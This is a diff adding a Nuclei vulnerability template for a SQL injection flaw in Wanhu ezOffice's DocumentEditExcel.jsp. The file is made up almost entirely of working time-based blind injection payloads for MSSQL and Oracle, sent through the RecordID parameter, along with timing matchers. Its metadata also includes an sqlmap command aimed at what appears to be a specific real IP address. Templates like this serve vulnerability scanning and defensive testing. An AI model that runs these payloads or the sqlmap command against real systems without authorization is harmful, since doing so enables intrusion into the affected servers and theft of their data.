@@ -1,0 +1,48 @@
+id: wanhu-ezoffice-DocumentEditExcel-sqli
+info:
+  name: 万户 ezoffice DocumentEditExcel.jsp - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/adysec/nuclei_poc/blob/5e11ca43745bd51a59d3df36d076c79a38aa7793/poc/sql/wanhu-ezoffice-documenteditexcel-sqli.yaml#L17
+    - https://github.com/adysec/nuclei_poc/blob/39b5247b19e77f668b429601d7262d0bcf484d38/poc/sql/wanhu-ezoffice-documenteditexcel-sqli.yaml#L17
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    sqlmap: sqlmap -u "http://8.142.133.144:7001/defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp;?RecordID=1" -p RecordID --batch --dbms=mssql --risk 3 --level 5 --technique=T
+    version:
+  tags: wanhu,sqli,oa,time,ezoffice
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp;?RecordID=1%27%20WAITFOR%20DELAY%20%270:0:6%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: mssql
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
+
+
+  - raw:
+      - |
+        @timeout: 15s
+        GET /defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp;?RecordID=1%27%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),6)-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: oracle
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
